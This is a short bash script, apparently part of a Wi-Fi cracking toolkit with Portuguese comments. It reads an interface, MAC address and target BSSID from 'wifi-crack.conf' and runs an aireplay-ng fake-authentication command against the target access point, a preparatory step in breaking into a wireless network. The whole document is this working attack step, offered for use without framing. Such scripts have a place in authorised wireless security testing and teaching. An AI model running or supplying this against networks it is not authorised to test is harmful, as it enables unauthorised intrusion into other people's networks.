#!/bin/bash

PWD="$(pwd)"
source "$PWD/wifi-crack.conf"
#### VARIAVEIS UTILIZADAS
# INTERFACE
# INTERFACE_MAC
# BSSID


aireplay-ng --fakeauth 0 -a "$BSSID" -h "$INTERFACE_MAC" $INTERFACE
